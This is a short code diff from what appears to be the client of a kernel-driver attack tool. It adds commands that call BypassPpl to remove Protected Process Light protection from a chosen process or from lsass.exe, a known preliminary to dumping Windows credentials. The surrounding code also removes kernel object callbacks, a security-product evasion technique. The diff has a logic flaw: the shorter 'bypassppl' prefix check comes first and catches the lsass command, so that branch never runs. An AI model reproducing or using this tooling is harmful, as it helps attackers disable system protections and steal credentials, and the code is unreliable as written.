@@ -96,6 +96,19 @@ int main() {
 			DeleteObjCallback(hDevice);
 		}
 
+
+		else if (strncmp(input, "bypassppl", 9) == 0) {
+			DWORD pid = atoi(input + 10);
+			if (pid == 0) {
+				printf("Invalid PID.\n");
+				continue;
+			}
+			BypassPpl(hDevice, pid);
+		}
+		else if (strncmp(input, "bypassppllsass", 14) == 0) {
+			DWORD64 pid = FindProcessId("lsass.exe");
+			BypassPpl(hDevice, pid);
+		}
 		else if (strncmp(input, "exit", 4) == 0) {
 			exit(0);
 		}
